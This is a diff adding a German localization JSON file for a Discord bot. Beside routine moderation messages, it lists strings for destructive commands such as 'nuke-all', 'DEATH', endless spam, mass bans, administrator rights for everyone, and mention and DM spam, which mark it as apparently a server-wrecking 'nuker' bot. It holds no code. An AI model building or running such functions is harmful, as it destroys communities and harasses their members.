@@ -1,0 +1,172 @@
+{
+  "bot_started": "BOT GESTARTET - {bot_user} (ID: {bot_id}) | Verbunden mit {guild_count} Server(n): {guild_list}",
+  "bot_prefix": "Bot-Präfix: {prefix} | Besitzer-ID: {owner_id}",
+  "bot_shutdown": "BOT HERUNTERFAHREN - Eingeleitet von: {user} (ID: {user_id}) | Server: {guild} (ID: {guild_id})",
+  "bot_shutdown_complete": "BOT HERUNTERFAHREN ABGESCHLOSSEN",
+  "bot_joined_guild": "BOT TRAT SERVER BEI - Server: {guild} (ID: {guild_id}) | Mitglieder: {member_count} | Besitzer: {owner} (ID: {owner_id})",
+  "bot_left_guild": "BOT VERLIESS SERVER - Server: {guild} (ID: {guild_id})",
+
+  "unauthorized": "UNBEFUGTER ZUGRIFF - Benutzer: {user} (ID: {user_id}) | Befehl: {command} | Server: {guild} (ID: {guild_id})",
+  "unauthorized_message": "⛔ Du bist nicht berechtigt, diesen Bot zu verwenden!",
+
+  "command_executed": "BEFEHL AUSGEFÜHRT - Benutzer: {user} (ID: {user_id}) | Befehl: {command} {args} | Server: {guild} (ID: {guild_id}) | Kanal: #{channel}",
+  "command_error": "BEFEHLSFEHLER - Benutzer: {user} (ID: {user_id}) | Befehl: {command} | Server: {guild} | Fehler: {error}",
+
+  "help_sent": "Hilfemenü an deine DMs gesendet!",
+  "help_dm_failed": "Ich konnte dir keine DM senden! Bitte aktiviere DMs von Servermitgliedern.",
+  "button_unauthorized": "⛔ Du kannst diese Schaltflächen nicht verwenden!",
+
+  "ban_success": "{member} gebannt",
+  "ban_yourself": "Du kannst dich nicht selbst bannen!",
+  "ban_higher_role": "Du kannst niemanden mit einer höheren oder gleichen Rolle bannen!",
+  "ban_bot_no_permission": "Ich kann niemanden mit einer höheren oder gleichen Rolle als ich bannen!",
+  "ban_no_permission": "Ich habe keine Berechtigung, diesen Benutzer zu bannen!",
+  "ban_dm": "Du wurdest in **{guild}** gebannt wegen {reason}",
+
+  "unban_success": "{user} entbannt",
+  "unban_not_found": "Benutzer nicht gefunden oder nicht gebannt!",
+  "unban_no_permission": "Ich habe keine Berechtigung, Benutzer zu entbannen!",
+
+  "kick_success": "{member} gekickt",
+  "kick_yourself": "Du kannst dich nicht selbst kicken!",
+  "kick_higher_role": "Du kannst niemanden mit einer höheren oder gleichen Rolle kicken!",
+  "kick_bot_no_permission": "Ich kann niemanden mit einer höheren oder gleichen Rolle als ich kicken!",
+  "kick_no_permission": "Ich habe keine Berechtigung, diesen Benutzer zu kicken!",
+  "kick_dm": "Du wurdest aus **{guild}** gekickt wegen {reason}",
+
+  "mute_success": "{member} für {duration} stummgeschaltet",
+  "mute_yourself": "Du kannst dich nicht selbst stummschalten!",
+  "mute_higher_role": "Du kannst niemanden mit einer höheren oder gleichen Rolle stummschalten!",
+  "mute_bot_no_permission": "Ich kann niemanden mit einer höheren oder gleichen Rolle als ich stummschalten!",
+  "mute_invalid_unit": "Ungültige Zeiteinheit! Verwende s (Sekunden), m (Minuten), h (Stunden) oder d (Tage)",
+  "mute_invalid_format": "Ungültiges Dauerformat! Beispiel: 10m, 1h, 30s, 1d",
+  "mute_no_permission": "Ich habe keine Berechtigung, diesen Benutzer stummzuschalten!",
+  "mute_dm": "Du wurdest in **{guild}** stummgeschaltet wegen {reason}",
+
+  "unmute_success": "{member} entstummt",
+  "unmute_no_permission": "Ich habe keine Berechtigung, die Stummschaltung dieses Benutzers aufzuheben!",
+
+  "purge_success": "{count} Nachrichten in {channel} gelöscht",
+  "purge_invalid_amount": "Bitte gib eine positive Anzahl von Nachrichten zum Löschen an!",
+  "purge_too_many": "Du kannst nur bis zu 1000 Nachrichten auf einmal löschen!",
+  "purge_no_permission": "Ich habe keine Berechtigung, Nachrichten in diesem Kanal zu löschen!",
+
+  "god_activated": "Gott-Modus aktiviert für {user}",
+  "god_no_permission": "Ich habe keine Berechtigung, Rollen zu erstellen oder zuzuweisen!",
+
+  "god_all_initiated": "👑 GOTT-MODUS FÜR ALLE EINGELEITET 👑\nGebe allen Mitgliedern Administratorrechte...",
+  "god_all_complete": "Gott-Modus aktiviert für {count} Mitglieder",
+
+  "nuke_starting": "Starte nuke-all Operation... Dies kann eine Weile dauern.",
+  "nuke_complete": "Nuke-all abgeschlossen: {channels} Kanäle, {categories} Kategorien, {roles} Rollen gelöscht",
+  "nuke_no_permission": "Ich habe keine Berechtigung, die nuke-all Operation durchzuführen!",
+
+  "delchannel_success": "#{channel} gelöscht",
+  "delchannel_no_permission": "Ich habe keine Berechtigung, diesen Kanal zu löschen!",
+
+  "nuke_channel_success": "{channel} genukelt",
+  "nuke_channel_no_permission": "Ich habe keine Berechtigung, Kanäle zu löschen/erstellen!",
+
+  "ban_all_starting": "Starte ban-all Operation... Dies kann eine Weile dauern.",
+  "ban_all_complete": "{count} Mitglieder gebannt",
+  "ban_all_no_permission": "Ich habe keine Berechtigung, Mitglieder zu bannen!",
+
+  "kick_all_starting": "Starte kick-all Operation... Dies kann eine Weile dauern.",
+  "kick_all_complete": "{count} Mitglieder gekickt",
+  "kick_all_no_permission": "Ich habe keine Berechtigung, Mitglieder zu kicken!",
+
+  "mute_all_starting": "Starte mute-all Operation für {duration}... Dies kann eine Weile dauern.",
+  "mute_all_complete": "{count} Mitglieder für {duration} stummgeschaltet",
+  "mute_all_no_permission": "Ich habe keine Berechtigung, Mitglieder stummzuschalten!",
+
+  "death_initiated": "⚠️ DEATH-BEFEHL EINGELEITET ⚠️\nLösche alle Kanäle, Rollen und banne alle Mitglieder...",
+  "death_complete": "DEATH abgeschlossen: {banned} gebannt, {channels} Kanäle gelöscht, {roles} Rollen gelöscht",
+  "death_no_permission": "Ich habe keine Berechtigung, den DEATH-Befehl auszuführen!",
+
+  "brainfuck_initiated": "🔥 UNENDLICHER BRAINFUCK-MODUS EINGELEITET 🔥\nLösche alle Kanäle...\nDann kontinuierliches Erstellen von Kanälen und Spam für immer!",
+  "brainfuck_active": "⚡ UNENDLICHER MODUS AKTIV - Erstellen und Spam für immer!",
+  "brainfuck_no_permission": "Ich habe keine Berechtigung, den BRAINFUCK-Befehl auszuführen!",
+
+  "spam_infinite_started": "⚠️ UNENDLICHER SPAM-MODUS AKTIVIERT ⚠️\nSpam in allen Kanälen: \"{message}\"\n\nDies wird auf unbestimmte Zeit fortgesetzt!",
+  "spam_started": "Spam gestartet: Sende \"{message}\" {count} mal in jedem Kanal...",
+  "spam_complete": "Spam abgeschlossen: {total} Nachrichten in {channels} Kanälen gesendet",
+  "spam_no_permission": "Ich habe keine Berechtigung, Nachrichten in Kanälen zu senden!",
+
+  "rename_server_success": "Server umbenannt in **{name}**",
+  "rename_server_no_permission": "Ich habe keine Berechtigung, den Server umzubenennen!",
+
+  "server_icon_success": "Server-Icon erfolgreich aktualisiert",
+  "server_icon_failed": "Fehler beim Herunterladen des Bildes von der URL!",
+  "server_icon_no_permission": "Ich habe keine Berechtigung, das Server-Icon zu ändern!",
+
+  "server_banner_success": "Server-Banner erfolgreich aktualisiert",
+  "server_banner_no_feature": "Dieser Server hat keinen Zugriff auf Banner! (Benötigt Boost-Level 2)",
+  "server_banner_failed": "Fehler beim Herunterladen des Bildes von der URL!",
+  "server_banner_no_permission": "Ich habe keine Berechtigung, das Server-Banner zu ändern!",
+
+  "server_desc_success": "Server-Beschreibung erfolgreich aktualisiert",
+  "server_desc_no_permission": "Ich habe keine Berechtigung, die Server-Beschreibung zu ändern!",
+
+  "nick_success": "Nickname von {member} zu **{nickname}** geändert",
+  "nick_higher_role": "Ich kann den Nickname von {member} nicht ändern - sie haben eine höhere oder gleiche Rolle als ich!",
+  "nick_no_permission": "Ich habe keine Berechtigung, den Nickname von {member} zu ändern!",
+
+  "nick_all_starting": "Starte nick-all Operation... Setze alle Nicknames auf \"{nickname}\"",
+  "nick_all_complete": "Nick-all abgeschlossen: {success} Nicknames geändert, {failed} fehlgeschlagen",
+  "nick_all_no_permission": "Ich habe keine Berechtigung, Nicknames zu ändern!",
+
+  "role_spam_starting": "Starte role-spam Operation... Erstelle {count} Rollen namens \"{name}\"",
+  "role_spam_complete": "Role-spam abgeschlossen: {created} Rollen erstellt, {failed} fehlgeschlagen",
+  "role_spam_invalid_count": "Bitte gib eine positive Anzahl von Rollen an!",
+  "role_spam_too_many": "Du kannst nur bis zu 250 Rollen auf einmal erstellen!",
+  "role_spam_no_permission": "Ich habe keine Berechtigung, Rollen zu erstellen!",
+
+  "webhook_nuke_starting": "Starte webhook-nuke Operation... Lösche alle Webhooks.",
+  "webhook_nuke_complete": "Webhook-nuke abgeschlossen: {count} Webhooks gelöscht",
+  "webhook_nuke_no_permission": "Ich habe keine Berechtigung, Webhooks zu verwalten!",
+
+  "strip_yourself": "Du kannst deine eigenen Rollen nicht entfernen!",
+  "strip_higher_role": "Ich kann die Rollen von {member} nicht entfernen - sie haben eine höhere oder gleiche Rolle als ich!",
+  "strip_no_roles": "{member} hat keine entfernbaren Rollen!",
+  "strip_success": "{count} Rollen von {member} entfernt",
+  "strip_no_permission": "Ich habe keine Berechtigung, Rollen von {member} zu entfernen!",
+
+  "emoji_nuke_starting": "Starte emoji-nuke Operation... Lösche alle benutzerdefinierten Emojis.",
+  "emoji_nuke_complete": "Emoji-nuke abgeschlossen: {count} Emojis gelöscht",
+  "emoji_nuke_no_permission": "Ich habe keine Berechtigung, Emojis zu verwalten!",
+
+  "shuffle_channels_starting": "Starte shuffle-channels Operation... Ordne alle Kanäle zufällig neu an.",
+  "shuffle_channels_complete": "Shuffle-channels abgeschlossen: {count} Kanäle neu angeordnet",
+  "shuffle_channels_no_permission": "Ich habe keine Berechtigung, Kanäle zu verwalten!",
+
+  "voice_scatter_starting": "Starte voice-scatter Operation... Verteile {count} Benutzer auf {channels} Kanäle.",
+  "voice_scatter_complete": "Voice-scatter abgeschlossen: {moved} Benutzer verschoben",
+  "voice_scatter_need_channels": "Benötige mindestens 2 Sprachkanäle um Benutzer zu verteilen!",
+  "voice_scatter_no_users": "Keine Benutzer in Sprachkanälen!",
+  "voice_scatter_no_permission": "Ich habe keine Berechtigung, Mitglieder zu verschieben!",
+
+  "move_all_starting": "Starte move-all Operation... Verschiebe {count} Benutzer nach {channel}.",
+  "move_all_complete": "Move-all abgeschlossen: {moved} Benutzer nach {channel} verschoben",
+  "move_all_no_users": "Keine Benutzer in Sprachkanälen!",
+  "move_all_no_permission": "Ich habe keine Berechtigung, Mitglieder zu verschieben!",
+
+  "mention_spam_starting": "Starte mention-spam Operation... Sende {count} Erwähnungen.",
+  "mention_spam_complete": "Mention-spam abgeschlossen: {sent} Erwähnungen gesendet",
+  "mention_spam_invalid_count": "Bitte gib eine positive Zahl an!",
+  "mention_spam_too_many": "Maximum 100 Erwähnungen auf einmal!",
+  "mention_spam_no_permission": "Ich habe keine Berechtigung, Nachrichten zu senden oder zu erwähnen!",
+
+  "dm_success": "Nachricht an {user} gesendet",
+  "dm_failed": "Konnte keine DM an {user} senden - sie haben DMs deaktiviert",
+
+  "dmall_starting": "Starte DM-all Operation... Sende Nachricht an alle Mitglieder.",
+  "dmall_complete": "DM-all abgeschlossen: {success} Nachrichten gesendet, {failed} fehlgeschlagen",
+
+  "serverinfo_sent": "Server-Informationen an deine DMs gesendet!",
+  "serverinfo_dm_failed": "Ich konnte dir keine DM senden! Bitte aktiviere DMs von Servermitgliedern.",
+
+  "shutdown_message": "Bot wird heruntergefahren",
+  "shutdown_farewell": "🔴 Bot wird heruntergefahren...",
+
+  "error_occurred": "Ein Fehler ist aufgetreten: {error}"
+}
